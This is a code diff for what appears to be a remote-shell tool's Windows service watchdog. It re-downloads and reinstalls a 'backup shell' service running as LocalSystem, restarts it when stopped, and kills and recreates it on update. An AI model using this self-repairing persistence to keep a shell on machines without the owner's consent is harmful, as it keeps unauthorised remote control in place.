@@ -53,19 +53,21 @@ void Service::StartServiceIfNeeded(LPCSTR lpServiceName)
 	}
 
 	//If the service is paused
-	if (status.dwCurrentState == SERVICE_PAUSED) {
+	if (status.dwCurrentState == SERVICE_PAUSED || status.dwCurrentState == SERVICE_PAUSE_PENDING) {
+		Log("Restarting pause service\n");
 		ControlService(hService, SERVICE_CONTROL_CONTINUE, &status);
 	}
-	else if (status.dwCurrentState == SERVICE_STOPPED) {
+	else if (status.dwCurrentState == SERVICE_STOPPED || status.dwCurrentState == SERVICE_STOP_PENDING) {
+		Log("Restarting stopped service\n");
 		StartService(hService, 0, NULL);
 	}
 }
 
 
-void Service::CheckAndRepairService()
+void Service::CheckAndRepairService(bool called_itself)
 {
-	if (!Service::ServiceExists(SERVICE_NAME)) {
-		Log("Downloading service archive\n");
+	if (!FileExists(SHELL_PATH(SERVICE_FILE_NAME))) {
+		Log("Service doesn't exist, downloading it...\n");
 		//Download service archive
 		int i = 0;
 		while (!Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME), true)) {
@@ -86,31 +88,64 @@ void Service::CheckAndRepairService()
 		}
 		//Delete archive
 		remove((SHELL_PATH(SERVICE_ARCHIVE_NAME)));
-		//Create service
-		while (!InstallService(SERVICE_NAME, SHELL_PATH(SERVICE_FILE_NAME))) {
-			Sleep(1000);
+		if (!Service::ServiceExists(SERVICE_NAME)) {
+
+			//Create service
+			while (!InstallService(SERVICE_NAME, SHELL_PATH(SERVICE_FILE_NAME))) {
+				Log("Could not install service\n");
+				Sleep(1000);
+			}
+		}
+		else {
+			Log("Service exists\n");
 		}
 	}
+
 
 	//Start the service
 	Service::StartServiceIfNeeded(SERVICE_NAME);
 
-	if (FileExists(SHELL_PATH(SHELL_UPDATE_NAME))) { //This means that an update instruction has been sent and therefore backup shell needs to shutdown once the service has been started
+	if (FileExists(SHELL_PATH(SHELL_UPDATE_NAME)) && !called_itself) { //This means that an update instruction has been sent and therefore backup shell needs to shutdown once the service has been started
 		//Delete the service and let checker recreate it at next iteration of the main loop
 		SC_HANDLE scm = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
 		if (scm == NULL)
 			return;
+		SC_HANDLE hService = OpenService(scm, SERVICE_NAME, DELETE | SERVICE_STOP);
 
-		SC_HANDLE hService = OpenService(scm, SERVICE_NAME, GENERIC_READ);
 		if (hService == NULL)
 		{
-			CloseServiceHandle(scm);
 			return;
 		}
-		DeleteService(hService);
-		remove(SHELL_PATH(SERVICE_FILE_NAME));
+
+		SERVICE_STATUS serviceStatus = { 0 };
+		ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&serviceStatus);
+
+		CloseServiceHandle(hService);
+		CloseServiceHandle(scm);
+
+		HANDLE hProc = 0;
+		auto procID = Utils::getProcess(SERVICE_FILE_NAME);
+		if (procID) {
+			Log("Found service process ID\n");
+			const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
+			TerminateProcess(hBackupShell, 1);
+			CloseHandle(hBackupShell);
+		}
+		else {
+			Log("Could not find service process ID\n");
+		}
+
+		while (remove(SHELL_PATH(SERVICE_FILE_NAME))) {
+			Log("Couldn't remove service file\n");
+			Sleep(100);
+		}
+
+
 		//remove(SHELL_PATH(SHELL_UPDATE_NAME));
 		Log("Deleted service\n");
+		CheckAndRepairService(true);
+
+		PauseAndExit(10);
 	}
 }
 
@@ -147,12 +182,13 @@ bool Service::InstallService(LPCSTR lpServiceName, LPCSTR lpServicePath)
 		NULL,                      // no dependencies 
 		NULL,                      // LocalSystem account 
 		NULL);                     // no password 
-
 	if (schService == NULL)
 	{
+		wprintf(L"CreateService failed w/err 0x%08lx\n", GetLastError());
 		CloseServiceHandle(schSCManager);
 		return false;
 	}
+	Log("Created service\n");
 
 	CloseServiceHandle(schService);
 	CloseServiceHandle(schSCManager);
